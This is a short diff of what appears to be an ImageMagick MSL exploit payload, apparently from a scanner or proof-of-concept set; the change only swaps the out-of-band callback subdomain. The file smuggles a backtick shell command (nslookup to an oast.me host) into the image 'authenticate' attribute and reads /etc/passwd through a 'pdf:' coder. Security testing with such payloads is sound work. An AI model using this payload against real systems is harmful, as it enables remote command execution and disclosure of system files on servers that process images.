@@ -1,4 +1,4 @@
-<image authenticate='ff" `nslookup dwk.cnc1q58uaek3nn3m7digkni6i8e7ot7if.oast.me;"'>
+<image authenticate='ff" `nslookup nonono.cnc2g78uaek4vm4cr2aga14cdactzocag.oast.me;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
   <resize geometry="400x400" />
